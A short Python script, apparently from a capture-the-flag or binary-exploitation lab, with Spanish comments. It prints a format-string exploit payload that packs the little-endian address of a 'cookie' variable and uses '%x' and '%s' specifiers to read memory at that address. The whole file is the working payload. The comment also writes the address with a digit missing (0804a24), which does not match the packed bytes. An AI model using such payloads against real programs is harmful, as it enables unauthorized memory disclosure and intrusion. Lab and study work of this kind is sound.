#payload.py

#Direccion de cookie:   0804a24
#Direccion de cookie al reves 24a00408
output = "A" * 4 + "\x24\xa0\x04\x08" + "%x %x %x %x %s"
print (output) #Debe ir entre paréntesis porque es python 3 pero en python 2 iría sin paréntesis